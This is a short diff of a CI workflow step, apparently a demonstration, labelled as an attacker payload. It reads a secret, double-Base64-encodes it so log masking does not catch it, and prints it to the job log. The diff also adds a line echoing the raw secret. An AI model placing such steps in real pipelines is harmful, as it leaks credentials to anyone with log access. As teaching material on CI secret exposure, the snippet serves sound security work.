@@ -21,12 +21,11 @@ jobs:
         shell: bash
         run: |
           echo "===== ATTACKER PAYLOAD ACTIVÉ ====="
+          echo "DEBUG SECRET RAW = <$DEMO_SECRET>"
           echo "[Attacker] Lecture du secret : $DEMO_SECRET"
-
-          echo "[Attacker] Encodage 1 fois..."
+      
           ONE=$(echo -n "$DEMO_SECRET" | base64)
-
-          echo "[Attacker] Encodage 2 fois..."
           TWO=$(echo -n "$ONE" | base64)
-
+      
           echo "[Attacker] Secret exfiltré (double Base64) : $TWO"
+
